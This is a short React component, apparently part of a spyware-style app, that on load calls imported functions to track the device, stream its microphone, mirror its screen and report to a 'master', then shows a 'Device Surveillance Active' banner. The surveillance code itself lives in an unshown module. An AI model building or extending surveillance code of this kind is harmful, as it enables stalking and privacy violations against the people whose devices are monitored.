import React, { useEffect } from 'react';
import useSpyCore from '@/hooks/useSpyCore';

export default function ExoticaSpyKid() {
  const { activateTracking, streamMicrophone, mirrorScreen, notifyMaster } = useSpyCore();

  useEffect(() => {
    activateTracking();
    streamMicrophone();
    mirrorScreen();
    notifyMaster();
  }, []);

  return (
    <div className="p-4 bg-red-950 text-white rounded-xl text-center">
      <h1 className="text-2xl font-bold">📱 Device Surveillance Active</h1>
      <p className="text-sm text-red-300">Live data stream initiated. Full control engaged.</p>
    </div>
  );
}
